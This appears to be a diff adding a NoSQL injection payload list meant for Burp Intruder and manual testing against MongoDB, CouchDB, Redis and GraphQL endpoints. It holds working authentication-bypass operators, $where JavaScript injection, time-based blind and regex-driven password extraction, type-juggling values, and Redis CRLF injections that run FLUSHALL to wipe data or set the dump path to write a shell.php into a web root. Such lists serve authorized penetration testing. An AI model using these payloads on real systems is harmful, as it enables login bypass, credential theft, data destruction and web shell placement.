@@ -1,0 +1,79 @@
+# ============================================================
+# NoSQL Injection Payloads
+# Targets: MongoDB, CouchDB, Redis, Cassandra
+# Use: Burp Intruder, manual in JSON/form body
+# ============================================================
+
+# ---- MongoDB — Authentication Bypass (JSON body) ----
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
+{"username": {"$gt": ""}, "password": {"$regex": ".*"}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": "admin", "password": {"$ne": "wrong"}}
+{"username": "admin", "password": {"$exists": true}}
+{"username": {"$regex": "admin"}, "password": {"$gt": ""}}
+{"username": {"$in": ["admin","administrator","root"]}, "password": {"$gt": ""}}
+
+# ---- MongoDB — Auth Bypass (URL-encoded form) ----
+username[$gt]=&password[$gt]=
+username[$ne]=invalid&password[$ne]=invalid
+username[$ne]=&password[$ne]=
+username=admin&password[$gt]=
+username[$regex]=admin&password[$gt]=
+username[$exists]=true&password[$exists]=true
+
+# ---- MongoDB — Operator Injection ----
+{"$where": "this.username == 'admin'"}
+{"$where": "return true"}
+{"$where": "1==1"}
+{"$where": "function(){return true}"}
+{"$where": "sleep(5000)"}
+{"$where": "this.password.match(/.*/)"}
+
+# ---- MongoDB — Data Extraction via $regex ----
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^b"}}
+{"username": "admin", "password": {"$regex": "^pa"}}
+{"username": "admin", "password": {"$regex": "^pas"}}
+# Automate: iterate chars to bruteforce password
+
+# ---- MongoDB — $where Time-Based Blind ----
+{"$where": "sleep(5000) || 1==1"}
+{"$where": "function(){if(this.password.match(/^a/)){sleep(5000)};return true;}"}
+{"$where": "if(this.username=='admin'){sleep(5000)}"}
+
+# ---- MongoDB — JS Injection (when $where enabled) ----
+';return 'a'=='a' && ''=='
+';return 'a'=='b' && ''=='
+' || 'a'=='a
+' || 1==1//
+'; sleep(5000); var x='
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+
+# ---- CouchDB ----
+{"selector": {"_id": {"$gt": null}}}
+{"selector": {"username": {"$regex": ".*"}}}
+{"selector": {"$or": [{"username": "admin"}, {"username": "administrator"}]}}
+
+# ---- Redis (via HTTP) ----
+# If app passes unsanitized input to Redis commands:
+\r\nFLUSHALL\r\n
+\r\nCONFIG SET dir /var/www/html\r\n
+\r\nCONFIG SET dbfilename shell.php\r\n
+*1\r\n$8\r\nFLUSHALL\r\n
+*3\r\n$3\r\nSET\r\n$4\r\ntest\r\n$4\r\ntest\r\n
+
+# ---- PHP Type Juggling (common with NoSQL/JSON) ----
+{"password": true}
+{"password": []}
+{"password": {}}
+{"password": 0}
+{"password": null}
+{"password": ""}
+
+# ---- GraphQL NoSQL Injection ----
+{"query": "{ users(filter: {password: {$gt: \"\"}}) { username password } }"}
+{"query": "{ login(username: \"admin\", password: {$ne: null}) { token } }"}
